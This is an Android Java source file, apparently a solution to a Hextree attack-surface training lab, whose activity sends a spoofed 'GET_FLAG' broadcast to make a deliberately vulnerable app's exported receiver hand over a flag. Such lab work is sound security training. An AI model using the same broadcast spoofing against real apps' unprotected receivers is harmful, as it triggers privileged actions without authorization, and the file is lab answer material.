 package niraj.patali.spoofingnotification;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent spoofIntent = new Intent("io.hextree.broadcast.GET_FLAG");
        spoofIntent.putExtra("give-flag", true);
        // Target the specific receiver in the Hextree app.
//        spoofIntent.setComponent(new ComponentName(
//                "io.hextree.attacksurface",
//                "io.hextree.attacksurface.receivers.Flag20Receiver"
//        ));
        sendBroadcast(spoofIntent);
    }
}